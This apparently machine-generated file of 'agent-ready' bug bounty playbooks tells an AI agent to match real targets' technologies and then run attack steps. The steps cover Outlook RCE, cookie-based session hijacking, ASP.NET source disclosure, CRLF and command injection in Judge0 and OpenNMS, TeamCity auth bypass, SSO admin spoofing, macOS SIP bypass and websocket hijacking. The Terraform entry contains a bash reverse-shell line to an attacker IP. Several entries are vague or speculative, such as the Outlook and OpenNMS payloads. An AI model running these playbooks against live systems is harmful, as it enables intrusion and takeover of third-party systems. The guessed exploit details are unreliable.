description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: CVE-2024-21378 — Remote Code Execution in Microsoft Outlook

trigger_conditions.when_to_apply: When a vulnerable version of Microsoft Outlook is installed and an attacker can control or influence the content of an email that will be rendered by Outlook.
prerequisites: Vulnerable version of Microsoft Outlook installed on the target machine.
applicability_signals: User opens a specially crafted email in Microsoft Outlook.
skip_if: Microsoft Outlook is updated to a patched version.

recon_steps: Step 1: Identify if the target environment uses a vulnerable version of Microsoft Outlook.
Step 2: Determine if the target users are likely to open emails from untrusted sources or that contain complex formatting.
attack_steps: Step 1: Craft a malicious email containing a specially formatted payload designed to exploit CVE-2024-21378. This payload would leverage specific Outlook rendering features.
Step 2: Send the crafted email to the target user's Outlook account.
Step 3: The user opens the email, triggering the vulnerability within Microsoft Outlook.
Step 4: The exploited vulnerability leads to the execution of arbitrary code on the target machine.
tools_recommended: insufficient detail in writeup
success_indicators: Remote code execution on the target machine.
Payload successfully executes on the target system.
failure_indicators: Email is not opened by the user.
Microsoft Outlook is patched and does not exhibit the vulnerable behavior.
A security solution (e.g., antivirus, EDR) detects and blocks the exploit.

playbooks.impact: Remote Code Execution (RCE) on the user's machine, allowing an attacker to take full control of the compromised system, steal data, install malware, or pivot to other systems within the network.
playbooks.key_lesson: Always ensure Microsoft Outlook is updated to the latest version to mitigate known RCE vulnerabilities.

meta.title: Securing the Computer Security Course: Discovering a Session Hijacking Vulnerability in EPFL's COM-301 Website

trigger_conditions.when_to_apply: When the target application uses session cookies to maintain authenticated state and it's possible to observe session cookies of other users or manipulate one's own session.
prerequisites: Attacker must have an authenticated session on one of the sibling websites.
applicability_signals: Presence of 'session' and 'remember_token' cookies after authentication.
Identical looking sibling websites with minor feature differences.
skip_if: No observable session cookies are set after authentication.
Session cookies are cryptographically signed or opaque and cannot be easily manipulated or predicted.

recon_steps: Step 1: Authenticate to any of the COM-301 homework websites (e.g., com301.epfl.ch) with a valid user account.
Step 2: Inspect the browser's cookies and identify the 'session' and 'remember_token' cookies.
Step 3: Analyze the format of the 'session' cookie. If it contains user identifiers or other potentially decodable information, attempt to understand its structure.
attack_steps: Step 1: Log in with an attacker's account to one of the sibling websites.
Step 2: Capture the authentication response and extract the 'session' cookie.

Step 3: Attempt to modify the attacker's 'session' cookie. In this specific case, the writeup implies the 'session' cookie contained a user ID ('_userid'). Attempt to change this user ID to that of another user (if known or guessable).
Step 4: Submit the modified 'session' cookie in subsequent requests to any of the sibling websites.
Step 5: Observe if the application now treats the attacker as the user whose ID was injected into the cookie.
tools_recommended: Burp Suite: Use the Repeater tab to modify and resend requests with altered session cookies.
Browser Developer Tools: Inspect and manipulate cookies directly for initial testing.
success_indicators: The application displays personalized data or allows actions associated with the target user's account after injecting their user ID into the 'session' cookie.
Accessing features or submission areas that should only be visible to the target user.
failure_indicators: The application logs out the attacker or returns an unauthorized error (e.g., 401, 403) after submitting the modified cookie.
The 'session' cookie is not properly decoded or does not contain a user identifier, indicating a different session management mechanism.

playbooks.impact: Attacker can hijack the session of any authenticated user by manipulating their own session cookie, gaining unauthorized access to their personal data, submissions, and potentially performing actions on their behalf.
playbooks.key_lesson: Always validate the integrity and authenticity of session tokens/cookies. Avoid embedding predictable or easily modifiable user identifiers directly within session cookies; consider using opaque, random session IDs tied to a server-side session store.

meta.title: Source Code Disclosure in ASP.NET apps

affected_components: web applications using cookieless sessions with `runAllManagedModulesForAllRequests` enabled
tech_stack_fingerprints: Response HTML contains `<form method="post" action=".*" .*id=".*LoginView" .*method="post">` (common for ASP.NET login pages)

trigger_conditions.when_to_apply: This technique is applicable to ASP.NET web applications that allow cookieless sessions and have the `runAllManagedModulesForAllRequests` setting enabled in IIS.
prerequisites: Target application uses ASP.NET framework
Target application allows cookieless sessions
Target application has `runAllManagedModulesForAllRequests='true'` configured in `system.webServer`
applicability_signals: HTTP response headers indicate ASP.NET and IIS. (e.g., `Server: Microsoft-IIS/10.0`, `X-Powered-By: ASP.NET`)
skip_if: Target application does not appear to be ASP.NET based
WAF blocks requests containing cookieless session identifiers (`/(S(X))/`, `/(A(X)F(Y))/` etc.)
No `/bin` directory is discoverable via IIS-ShortName-Scanner or direct path traversal.

recon_steps: Step 1: Analyze HTTP response headers for indicators of ASP.NET and IIS. (e.g., `Server: Microsoft-IIS/X.X`, `X-Powered-By: ASP.NET`)

Step 2: Attempt to identify if cookieless sessions are enabled by appending patterns like `/(S(X))/`, `/(Y(Z))/`, or `/(G(AAA-BBB)D(CCC=DDD)E(0-1))/` (with a placeholder `X`, `Y`, `Z`, etc.) to the base URL and check for a 200 OK response.

Step 3: (Optional but recommended) Use IIS-ShortName-Scanner with the `::$INDEX_ALLOCATION` trick to probe for the existence of the `/bin` directory and its contents. Target URL format: `https://<TARGET_URL>/bin::$INDEX_ALLOCATION/`
attack_steps: Step 1: If cookieless sessions are identified as enabled, construct a URL that includes a cookieless session identifier and attempts to access the `/bin/` directory. Example: `GET /<SESSION_ID_PATTERN>/bin/`

Step 2: If the `/bin/` directory is not directly accessible but IIS-ShortName-Scanner indicates its existence or potential contents, attempt to retrieve DLL files from the `/bin/` directory using a cookieless session identifier. Example: `GET /<SESSION_ID_PATTERN>/bin/Navigator.dll` (replace `Navigator.dll` with a likely assembly name or one discovered via IIS-ShortName-Scanner)

Step 3: If a DLL file is successfully downloaded, analyze its contents for source code or sensitive information. If RCE is identified within the DLL (as per writeup), further exploitation is possible.
payloads_or_patterns: /(S(X))/ (where X is a placeholder string like 'aaaaaaaa')
tools_recommended: Burp Suite: To intercept and modify requests, test different session identifier patterns.
IIS-ShortName-Scanner: To enumerate files and directories within IIS virtual directories that might not be directly accessible.
A HEX editor or decompiler (e.g., dnSpy): To analyze downloaded DLL files.
success_indicators: A 200 OK HTTP response when requesting a DLL file from the `/bin/` directory using a cookieless session identifier.
Successfully downloading a `.dll` file from the target server.
Analysis of the downloaded DLL reveals source code or executable logic.
failure_indicators: Consistently receiving 404 Not Found or 403 Forbidden for requests to the `/bin/` directory and its contents, even with cookieless session identifiers. This might indicate the feature is disabled or heavily protected.
WAF blocking requests containing session identifier patterns. (Pivot: Try other WAF bypass techniques for cookieless sessions.)
Unable to identify ASP.NET/IIS technology stack. (Skip: This technique is specific to ASP.NET on IIS.)

playbooks.impact: Disclosure of application source code, potentially revealing sensitive logic, credentials, configuration details, or unpatched vulnerabilities within the .NET assemblies.
playbooks.key_lesson: When targeting ASP.NET applications on IIS, investigate the possibility of source code disclosure via the `/bin/` directory, especially if cookieless sessions are enabled and the `runAllManagedModulesForAllRequests` setting is active.

meta.title: CVE-2023-36049: Microsoft .NET CRLF Injection Arbitrary File Write/deletion Vulnerability
meta.authors: Trend Micro Research Team (Justin Hung, Yazhi Wang), Piotr Bazydło (ZDI)

target_profile.technology: .NET Framework / Visual Studio (specifically FTP client implementations)
affected_components: FTP client functionality within .NET applications using FtpControlStream and FtpWebRequest classes.
tech_stack_fingerprints: Implied usage of FTP protocol via .NET libraries.

trigger_conditions.when_to_apply: When an application uses .NET Framework's FTP client libraries (FtpControlStream, FtpWebRequest) to interact with an FTP server, and the application doesn't properly sanitize user-supplied input that forms FTP commands or URIs.
prerequisites: Target application must utilize .NET Framework's FTP client functionality.
An attacker must be able to control input that is used to construct FTP commands or URIs processed by the vulnerable .NET functions.
applicability_signals: Observing an application making FTP connections using .NET libraries.
Identified FTP client endpoints or functionalities within the target application.
skip_if: The target application does not use .NET Framework for FTP operations.
All FTP command parameters and URIs are strictly validated and sanitized by the application before being passed to the .NET FTP client functions.

recon_steps: Step 1: Identify applications or services within the target that leverage FTP for file transfer or management.
Step 2: Determine if these FTP functionalities are implemented using .NET Framework libraries by examining application code or behavior.
attack_steps: Step 1: Construct a malicious FTP command by injecting CRLF characters followed by a new FTP command (e.g., 'DELE <filename>'). The command should be crafted to bypass input validation if possible.

Step 2: Send the crafted command to the FTP server via the vulnerable .NET FTP client. The expected structure would be `RETR <original_filename><CRLF>DELE <target_file_to_delete><CRLF>` or similar for file write operations.
Step 3: Observe the FTP server's response for successful execution of the injected command, such as confirmation of file deletion or modification.
tools_recommended: Burp Suite: To intercept and modify FTP commands sent from the .NET client to the server.
Custom script (Python/C#): To automate the injection of CRLF sequences into FTP command parameters or URIs when interacting with the target application's FTP client.
success_indicators: The FTP server acknowledges the execution of the injected command (e.g., a '250 DELE successful' message).
The target file is successfully deleted or a new file is written to the FTP server without explicit user authorization for that action.
failure_indicators: The FTP server rejects the command with an error message indicating invalid syntax or unauthorized command.
The FTP server does not execute the injected command, indicating that input validation is effective or the command structure is incorrect.

playbooks.impact: An attacker can arbitrarily write or delete files on the FTP server, leading to data loss, configuration manipulation, or denial of service. This can escalate to remote code execution if critical configuration files or executables are targeted.
playbooks.key_lesson: Always sanitize and validate all user-controlled input used in FTP commands and URIs when using .NET Framework's FTP client libraries to prevent CRLF injection and subsequent arbitrary file operations.

meta.title: Angular-ing for AuthZ, Problematic anti-patterns in Single Sign On Systems

tech_stack_fingerprints: REST API endpoints called by Angular

trigger_conditions.when_to_apply: Applicable when an application uses Single Sign On (SSO) and exposes a user search API that is called with an email address to retrieve user information, and API key authentication is handled client-side.
prerequisites: Target uses SSO (e.g., Microsoft)
Application makes client-side API calls to retrieve user information after SSO authentication.
applicability_signals: Angular front-end detected
Client-side JavaScript contains API keys
A user search API endpoint exists that accepts an email address.
SSO login flow involves retrieving user email after authentication.
skip_if: API keys are not exposed client-side
User search API does not accept email as a parameter
SSO flow does not involve retrieving user email for subsequent API calls

recon_steps: Step 1: Fingerprint the application to confirm it's an Angular application making client-side API calls.
Step 2: Analyze network traffic during the login flow to identify the user search API endpoint and the parameters it accepts, particularly for user identification.
attack_steps: Step 1: Identify the user search API endpoint and the parameter used for searching users (e.g., email).
Step 2: Attempt to discover valid user emails by searching LinkedIn and Google for company-related emails. If this fails, try wildcard patterns.
Step 3: If direct email enumeration is unsuccessful, test the user search API with a wildcard value (e.g., 'all' or '*') to enumerate all users.

Step 4: Once a list of valid user emails (or a mechanism to enumerate them) is obtained, identify how the application modifies its client-side code (e.g., Angular code) to simulate a successful SSO login.

Step 5: Modify the client-side code to set the authenticated user's email to a high-privilege account's email (e.g., Global Admin). This may involve intercepting and altering API responses or manipulating JavaScript execution.
Step 6: Trigger the application's logic that relies on the authenticated user's details (e.g., accessing protected resources, performing actions).
payloads_or_patterns: Modified client-side JavaScript to set user email to '<admin_email>'
tools_recommended: Burp Suite: Intercept and analyze network requests, modify client-side JavaScript.
Developer Tools (Browser): Inspect client-side code and network traffic.
success_indicators: The application grants access to administrative functions or data normally restricted to privileged users.
User profile information displayed reflects the 'Global Admin' account, not the original authenticated user.
Access to restricted data or features is granted without proper authorization.
failure_indicators: User search API returns an error or no results for wildcard queries → The API might not be vulnerable to enumeration, try other reconnaissance methods for emails.
Client-side code modifications do not alter the perceived logged-in user or access level → The application may have server-side validation for SSO session state that cannot be bypassed client-side.

playbooks.impact: An attacker can gain unauthorized administrative access to the application by impersonating a Global Administrator, allowing them to view, modify, or delete sensitive data, and perform any action available to an administrator.
playbooks.key_lesson: When applications use client-side logic to process user information obtained via SSO, always test for parameter manipulation in user lookup APIs and attempt to spoof higher-privileged user identities by modifying client-side code or API responses.

meta.title: Breaking SIP With Apple-signed Packages
meta.vuln_type: SIP Bypass via Command Injection in PackageKit

affected_components: PackageKit installation scripts (specifically those used by system_installd)

trigger_conditions.when_to_apply: When an Apple-signed package is being installed or updated on a live macOS volume, and the installation scripts are vulnerable to environment variable injection.
prerequisites: Attacker can create or modify an Apple-signed package.
The target macOS system has SIP enabled.
The package installation targets a live volume.
The package installation script improperly handles environment variables inherited from the installer process.
applicability_signals: Observing that `system_installd` is used for package installation (indicating an Apple-signed package on a live volume).

Identifying installation scripts within a package that execute commands without sanitizing inherited environment variables (e.g., a script that executes `/usr/bin/sudo -u $USER /usr/bin/open "$TEAMS_APPLICATION"`).
skip_if: Package installation is handled by `installd` and not `system_installd` (indicating it's not an Apple-signed package on a live volume).
Package installation scripts properly sanitize or unset inherited environment variables before execution.

recon_steps: Step 1: Identify potential targets by searching for macOS applications that use Apple-signed packages for installation or updates.

Step 2: Analyze the installation scripts of identified packages for instances where commands are executed with inherited environment variables, particularly those that might lead to code execution or arbitrary file modification.
attack_steps: Step 1: Craft a malicious Apple-signed package containing a custom installation script.
Step 2: Embed a command within the installation script that leverages environment variable inheritance to execute arbitrary code or modify critical system files.
Step 3: Distribute and trick a user into installing the malicious package on a target macOS system.

Step 4: The `system_installd` process, when executing the package's installation script, will inherit and use the attacker-controlled environment variables, leading to the execution of the malicious payload with elevated privileges, potentially bypassing SIP.
payloads_or_patterns: Example of a vulnerable script line: `/usr/bin/sudo -u $USER /usr/bin/open "$MALICIOUS_VARIABLE_EFFECT"` where `$MALICIOUS_VARIABLE_EFFECT` is an attacker-controlled environment variable that manipulates command execution.

Payload example: Setting an environment variable like `PATH=/usr/local/bin:/usr/bin:/bin:/sbin:/usr/sbin:/attacker_bin` to prepend a malicious directory to the PATH, allowing an attacker-controlled executable to be run.
tools_recommended: macOS command-line tools (e.g., `pkgbuild`, `productsign`) for creating and signing packages.
A debugger or script analysis tools to inspect environment variable inheritance during script execution.
success_indicators: Execution of arbitrary commands with elevated privileges.
Modification of files or directories that are normally protected by SIP.
Successful bypass of SIP restrictions (e.g., ability to modify protected system files).
Confirmation of CVE-2023-38609 in the system logs or via post-exploitation checks.
failure_indicators: Package installation fails with a permission error that cannot be overcome by environment variable manipulation.
The script executes as expected but does not lead to privilege escalation or SIP bypass, indicating proper sanitization of environment variables.
No arbitrary command execution is observed, suggesting the inherited environment variables do not grant unintended privileges.

playbooks.impact: Bypassing System Integrity Protection (SIP) on macOS, allowing an attacker to modify critical system files, execute arbitrary code with root privileges, and potentially gain complete control over the compromised system.
playbooks.key_lesson: Always sanitize and explicitly define environment variables used in installation scripts, especially when dealing with privileged processes or package managers, to prevent command injection and privilege escalation vulnerabilities.

meta.title: CVE-2024-27198 and CVE-2024-27199: JetBrains TeamCity Multiple Authentication Bypass Vulnerabilities

trigger_conditions.when_to_apply: When the target is an unauthenticated JetBrains TeamCity server, any request that results in an HTTP 404 response can be leveraged to bypass authentication.
prerequisites: Target is JetBrains TeamCity. Target is accessible via HTTP or HTTPS.
applicability_signals: Target responds with HTTP 404 for requests to non-existent endpoints, and the response does not immediately terminate processing without invoking the view update logic.
skip_if: Target returns a 401 or 403 for all requests, or a WAF blocks requests to common TeamCity administrative paths.

recon_steps: Step 1: Identify JetBrains TeamCity instances by scanning for open HTTP port 8111 or by fingerprinting TeamCity specific HTTP headers or HTML content.
Step 2: Confirm the TeamCity version is prior to 2023.11.4. This can often be found in HTTP headers (e.g., X-TeamCity-Version) or within HTML source code.
attack_steps: Step 1: Send a request to a non-existent endpoint on the TeamCity server, ensuring it will trigger an HTTP 404 response. For example, send a GET request to /some/nonexistent/path.
Step 2: Observe the server's response. If the server attempts to render a view or perform post-processing after the 404, the authentication bypass may be exploitable.

Step 3: Craft a request targeting an authenticated endpoint by appending parameters that trigger the bypass. For CVE-2024-27198, the bypass is triggered by requests to authenticated endpoints that result in a 404 response and then proceed to the updateViewIfRequestHasJspParameter method. The exact exploit path is not fully detailed for unauthenticated RCE, but the principle involves triggering the vulnerable controller logic.
payloads_or_patterns:
GET /api/latest/builds/commit/<COMMIT_HASH> HTTP/1.1
Host: <TARGET_URL>
User-Agent: Mozilla/5.0

 (This is a placeholder for an authenticated endpoint that could be tested for the bypass mechanism, the exact endpoint will vary.)
tools_recommended: Burp Suite: Use Repeater to send crafted requests and observe responses. Use Intruder to fuzz potential endpoints that might trigger the 404 bypass.
success_indicators: Access to authenticated API endpoints or administrative functions without authentication.
Successful modification of server configuration (e.g., replacing the HTTPS certificate for CVE-2024-27199).
Demonstration of Remote Code Execution (RCE) for CVE-2024-27198.
failure_indicators: All requests to supposed authenticated endpoints are immediately blocked with a 401 or 403, indicating the bypass is not active or a WAF is present. Try alternative non-existent paths or different HTTP methods. If only information disclosure is observed for CVE-2024-27199, the full RCE for CVE-2024-27198 is likely not achievable with this specific exploit path.

playbooks.impact: Complete compromise of a vulnerable TeamCity server, allowing for full control over projects, builds, agents, and artifacts, enabling potential supply chain attacks. Limited information disclosure and system modification, including the ability to replace the HTTPS certificate.
playbooks.key_lesson: When encountering web applications, test non-existent endpoints that result in 404 responses to see if they trigger internal view rendering or controller logic that might bypass authentication checks.

meta.title: IDOR to Describe Other Users' Images on Google Gemini (Bard)
meta.authors: Roni Carta (Lupin), Joseph Thacker (rez0), Justin Gardner (Rhynorater)

trigger_conditions.when_to_apply: When the target application allows authenticated users to upload and process images, and the processing requests might be vulnerable to IDOR.
prerequisites: Attacker must have an authenticated user account.
applicability_signals: An endpoint exists for image uploads and processing.
Requests for image processing contain identifiable parameters that could be manipulated.
skip_if: Requests for image processing are stateless and do not contain any user-identifiable parameters.
All image processing requests are signed or validated server-side in a way that prevents parameter manipulation.

recon_steps: Step 1: Authenticate as a regular user and upload an image using the application's interface.
Step 2: Intercept the HTTP request for image upload/processing using a proxy (e.g., Burp Suite).
Step 3: Analyze the intercepted request, paying close attention to the request body and URL parameters for any identifiers related to the uploaded image or the processing task.
attack_steps: Step 1: As User 1, upload an image via the application's interface.

Step 2: Proxy the request and identify the endpoint and body parameters involved in the image processing. The writeup mentions: POST /_/BardChatUi/data/assistant.lamda.BardFrontendService/StreamGenerate?bl=boq_assistant-bard-web-server_20230711.08_p0&_reqid=1629608&rt=c HTTP/2
Step 3: Locate the path parameter within the request body, which is expected to be a path to the uploaded resource. The writeup provides an example: /contrib_service/ttl_1d
Step 4: Attempt to modify this path parameter. While the writeup doesn't specify *how* to modify it (e.g., using another user's image ID or a crafted path), the core idea is to change the identifier.
Step 5: Send the modified request.
Step 6: Observe the response for any indication that another user's image data or description was returned.
payloads_or_patterns:
POST /_/BardChatUi/data/assistant.lamda.BardFrontendService/StreamGenerate?bl=boq_assistant-bard-web-server_20230711.08_p0&_reqid=<REQUEST_ID>&rt=c HTTP/2
... (request body containing a path like /contrib_service/ttl_1d)
tools_recommended: Burp Suite: To intercept, analyze, and modify HTTP requests. Intruder can be used to systematically test different path variations if a pattern is identified.
success_indicators: The application returns a description or access to an image that was uploaded by a different authenticated user.
The response contains details (like image metadata or a link to the image) that do not correspond to the image uploaded by the attacker's account.
failure_indicators: A 403 Forbidden or 401 Unauthorized error is returned, indicating access control is correctly enforced.
The application returns an error stating the resource was not found (e.g., 404), suggesting the manipulated path is invalid.
The application returns the description of the original image uploaded by the attacker, indicating the path parameter was not successfully manipulated or checked.

playbooks.impact: An attacker can view and retrieve images uploaded by other authenticated users, leading to unauthorized access to private or sensitive user data.
playbooks.key_lesson: When processing uploaded files or associated data via API requests, always validate that the requested resource identifier (e.g., path, ID) belongs to the currently authenticated user and is not susceptible to enumeration or manipulation.

meta.title: OpenNMS Vulnerabilities: Securing Code against Attackers’ Unexpected Ways

tech_stack_fingerprints: OpenNMS is an open-source network management platform

trigger_conditions.when_to_apply: When OpenNMS is deployed and accessible externally, and its SNMP service is exposed to potentially untrusted input.
prerequisites: SNMP service is running and accessible.
applicability_signals: The presence of code that constructs system commands based on SNMP input.
Analysis of OpenNMS's codebase reveals functions that execute external commands using user-supplied parameters, particularly those related to SNMP queries or configurations.
skip_if: SNMP service is not exposed or is not running.
The analyzed code paths do not involve direct command execution based on user input from SNMP.

recon_steps: Step 1: Identify if the target system is running OpenNMS. This can be done via banner grabbing or checking for common OpenNMS ports (e.g., 80, 8980, 1099, 161 for SNMP).
Step 2: If OpenNMS is identified, determine if the SNMP service is accessible from the attacker's network.
attack_steps: Step 1: Craft an SNMP request that includes malicious input designed to exploit command injection vulnerabilities in OpenNMS's SNMP handling logic.
Step 2: Send the crafted SNMP request to the target OpenNMS instance.
Step 3: Monitor the target system for signs of command execution, such as unexpected network connections, file creation/modification, or process spawning.
payloads_or_patterns: This specific writeup mentions code review findings rather than direct exploitation steps or payloads. However, a typical OS command injection payload for SNMP might involve crafting a malicious OID or value that, when processed by OpenNMS, results in command execution. For example, if OpenNMS uses a command like `snmpget -v2c -c public <host> <oid>` and a specific OID is vulnerable, an attacker might try to inject shell metacharacters like `;`, `|`, `&`, `&&` followed by a command, e.g., `<malicious_oid>;<command_to_execute>`.
tools_recommended: Net-snmp tools (snmpget, snmpwalk) for crafting and sending SNMP requests.
Vulnerability scanner capable of detecting OS command injection.
Code analysis tools (like SonarQube, as implied by the source) to identify vulnerable code patterns.
success_indicators: Successful execution of a command on the target server, confirmed by a callback to an attacker-controlled server, unexpected file system changes, or abnormal process activity.
Receiving a response that indicates command execution has occurred, such as output from the executed command.
failure_indicators: All crafted SNMP requests result in standard SNMP errors or timeouts, indicating no command injection is possible through that vector. Pivot to other known vulnerabilities or attack vectors within OpenNMS.
The system logs errors related to invalid SNMP packets, suggesting the payload was malformed or not interpreted as intended. Refine payload construction.

playbooks.impact: Remote code execution on the OpenNMS server, allowing an attacker to gain full control of the affected system, potentially leading to data exfiltration, further network compromise, or denial of service.
playbooks.key_lesson: Code review OpenNMS's handling of user-supplied input, particularly within its SNMP service, to identify and mitigate OS command injection vulnerabilities by strictly sanitizing or escaping all external data before it's used in system commands.

meta.title: Judge0 Sandbox Escape

trigger_conditions.when_to_apply: When the target Judge0 instance allows submission of `command_line_arguments` via its API and does not properly sanitize newline characters.
prerequisites: Access to the Judge0 submission API endpoint.
applicability_signals: The API endpoint accepts `command_line_arguments`.
The `isolate_job.rb` script processes `command_line_arguments` and writes them to a `run_script` without sufficient sanitization of newline characters.
skip_if: The `command_line_arguments` are strictly validated and do not allow newline characters.
The Judge0 instance is not running with `--privileged` Docker mode, preventing potential host system compromise.

recon_steps: Step 1: Identify the Judge0 submission API endpoint, typically `/submissions`.
Step 2: Analyze the `isolate_job.rb` script or similar backend code to confirm how `command_line_arguments` are processed and if newline characters are sanitized.
attack_steps: Step 1: Send a POST request to the `/submissions` endpoint.
Step 2: Include a `source_code` and `language_id` (e.g., language_id: 46).

Step 3: In the `command_line_arguments` parameter, inject commands using a newline character. Prepend with a dummy character like 'x' if `strip` is used before sanitization. Example: `x\n<command_to_execute>`
Step 4: Monitor the `stdout` or `stderr` of the response for the output of the injected command.
tools_recommended: curl for sending requests.
Burp Suite or similar proxy to intercept and modify requests.
success_indicators: The `stdout` field in the JSON response contains the output of the injected command (e.g., 'echo POC' results in 'POC' in stdout).
Execution of commands that reveal host system information or allow further interaction.
failure_indicators: API returns an error indicating invalid arguments or no command execution.
No observable output from injected commands in the response.
Possible pivot: If newline injection fails, explore other command injection vectors or bypasses for the `gsub` sanitization.

playbooks.impact: Arbitrary command execution within the Judge0 sandbox. If Judge0 runs in a privileged Docker container, this can lead to a sandbox escape and root-level compromise of the host machine.
playbooks.key_lesson: Always sanitize user-supplied command-line arguments, paying close attention to newline characters and other special shell metacharacters that can be used for command injection.

meta.title: MeshCentral Cross-Site Websocket Hijacking Vulnerability (CVE-2024-26135)

tech_stack_fingerprints: uses websockets for frontend to backend communication

trigger_conditions.when_to_apply: The target must be a MeshCentral instance accessible by the victim user, and the attacker must be able to trick the victim into visiting a malicious link.
prerequisites: Victim user must be logged into MeshCentral.
Attacker must be able to host a malicious webpage.
applicability_signals: The target application uses websockets for communication.
The application has an endpoint like 'control.ashx' that handles management tasks over websockets.
The SameSite security policy on cookies is not sufficiently restrictive (e.g., SameSite=None).
skip_if: MeshCentral instance is not accessible to the victim.
The SameSite cookie policy is set to Strict or Lax without a mechanism for attackers to control the initial navigation to the target site.

recon_steps: Step 1: Identify if the target application utilizes websockets for core functionalities by observing network traffic in browser developer tools.
Step 2: Analyze websocket messages for sensitive operations like user management, token generation, or remote command execution.
Step 3: Confirm the presence of an endpoint like 'control.ashx' that handles websocket communication for management tasks.
attack_steps: Step 1: Craft a malicious HTML page that includes JavaScript code designed to establish a websocket connection to the target MeshCentral instance's 'control.ashx' endpoint.
Step 2: The JavaScript code will attempt to connect to the websocket as the victim user.
Step 3: Utilize the established websocket connection to perform actions on behalf of the victim user, such as generating login tokens or leaking sensitive session information (e.g., sessionKey).
Step 4: The attacker's server hosts the malicious page and tricks the victim into visiting it.
payloads_or_patterns: Malicious HTML page with JavaScript to initiate websocket connection to <TARGET_URL>/control.ashx. Specific JavaScript payload to be determined based on MeshCentral's websocket protocol for token generation or session leakage.
tools_recommended: Burp Suite (for proxying and analyzing websocket traffic), Custom JavaScript for exploit development.
success_indicators: Ability to generate new login tokens for the victim user's account.
Leakage of the sessionKey variable, which can be used to forge session cookies.
Successful execution of administrative actions on MeshCentral as the victim user without their explicit consent.
failure_indicators: Websocket connection fails with CORS errors or origin restrictions.
Websocket messages indicate insufficient permissions for the attempted actions.
403 Forbidden responses when attempting to connect to control.ashx.

playbooks.impact: Complete compromise of the victim user's MeshCentral account, enabling persistent access, the generation of new login tokens, and potentially the leakage of session keys allowing for session cookie forgery. If the victim is an administrator, this can lead to full control over the MeshCentral instance and all managed endpoints.
playbooks.key_lesson: Always validate the origin of websocket connections and ensure proper authorization checks are in place for all actions performed over websockets, especially those involving sensitive operations or administrative privileges.

meta.title: Hacking Terraform State for Privilege Escalation

affected_components: Terraform state file stored in S3 bucket

trigger_conditions.when_to_apply: When an attacker can gain write access to a Terraform state file stored in an S3 bucket and can influence the Terraform initialization process.
prerequisites: Attacker has write access to a specific S3 bucket containing a 'terraform.state' file.
Terraform is used for infrastructure management within the target environment.
applicability_signals: Existence of a 'terraform.state' file in an accessible S3 bucket.
Ability to control or modify the Terraform initialization process (e.g., by providing custom provider configurations).
skip_if: Terraform state file is encrypted and the attacker cannot decrypt it.
S3 bucket permissions prevent any write access for the attacker.

recon_steps: Step 1: Identify S3 buckets that contain 'terraform.state' files. Use cloud enumeration tools or brute-force S3 bucket names.
Step 2: Verify write access to the identified S3 bucket. Attempt to upload a dummy file to confirm permissions.
attack_steps: Step 1: Craft a malicious Terraform provider configuration that executes arbitrary code during initialization. For example, a custom provider that runs a reverse shell.
Step 2: Replace the legitimate 'terraform.state' file in the S3 bucket with a modified version that forces Terraform to use the malicious provider upon the next `terraform init` or `terraform apply`.
Step 3: Trigger a Terraform operation (e.g., `terraform init`, `terraform plan`, `terraform apply`) that will cause the compromised system to execute the malicious provider code.
payloads_or_patterns: Custom Terraform provider code (e.g., Go, Python) designed to execute arbitrary commands on the host where `terraform init` is run. Example: A provider that calls `os.system('/bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"')`.
tools_recommended: AWS CLI: For interacting with S3 buckets (uploading/downloading state files).
Custom Terraform Provider development tools (e.g., Go, Python SDKs): To build the malicious provider.
success_indicators: Receiving a reverse shell connection from the compromised infrastructure.
Arbitrary command execution confirmed on the host running Terraform.
failure_indicators: Terraform initialization fails with errors related to provider installation or configuration. This might indicate the target environment restricts custom providers or has strong validation. Pivot to researching available Terraform providers and their potential for exploitation.
No reverse shell connection received. This could mean the malicious provider was not executed, or the network path is blocked. Verify network connectivity and re-examine provider implementation.

playbooks.impact: Full infrastructure compromise. By controlling the Terraform state and provider initialization, an attacker can execute arbitrary code on the machine running Terraform, leading to complete takeover of the infrastructure managed by that Terraform instance. This includes creating, modifying, or deleting any cloud resources.
playbooks.key_lesson: Always ensure Terraform provider sources are trusted and verified. Implement strict access controls on S3 buckets storing Terraform state files, and consider encrypting the state file to prevent unauthorized modification.

meta.title: Leaking ObjRefs to Exploit HTTP .NET Remoting

trigger_conditions.when_to_apply: When an ASP.NET web application exposes .NET Remoting services over HTTP and there's a mechanism to trigger exceptions within the .NET Remoting deserialization process that can leak internal object URIs.
prerequisites: Target application is built with .NET Framework and uses ASP.NET.
HTTP channel for .NET Remoting is enabled (e.g., *.rem or *.soap endpoints).
applicability_signals: Application responds to requests on *.rem or *.soap endpoints.
Application exhibits specific error messages or behaviors when malformed .NET Remoting requests are sent.
skip_if: No *.rem or *.soap endpoints found.
Application strictly validates incoming .NET Remoting requests, preventing deserialization errors.
WAF blocks requests targeting .NET Remoting endpoints.

recon_steps: Step 1: Identify potential .NET Remoting endpoints by fuzzing common patterns like *.rem and *.soap on the target application.
Step 2: Analyze responses to malformed .NET Remoting messages (e.g., invalid serialized objects) to detect exceptions that might leak internal object URIs or ObjRefs.
attack_steps: Step 1: Send a crafted .NET Remoting request that is likely to trigger an exception in the `SoapServerFormatterSink` or `BinaryServerFormatterSink`.
Step 2: Analyze the response for leaked `ObjRef` data within the `LogicalCallContext` or error messages.
Step 3: If an `ObjRef` is leaked, reconstruct the object URI and attempt to invoke methods on it, potentially leading to RCE.
payloads_or_patterns: Crafted serialized .NET objects designed to cause deserialization errors.
Requests targeting *.rem or *.soap endpoints with invalid or malformed payloads.
tools_recommended: Burp Suite with a custom serializer/deserializer for .NET objects.
A .NET deserialization tool for crafting malicious payloads.
Custom scripts for fuzzing and analyzing responses.
success_indicators: Leaked `ObjRef` data in the response.
Successful invocation of methods on leaked objects, leading to unexpected behavior or code execution.
Receiving callbacks on a listener controlled by the attacker after a successful exploit.
failure_indicators: Generic error messages without leaked `ObjRef` data (e.g., from `HttpRemotingHandler`).
4xx or 5xx errors that do not indicate deserialization issues or object leakage.
Requests are blocked by a WAF without further information.

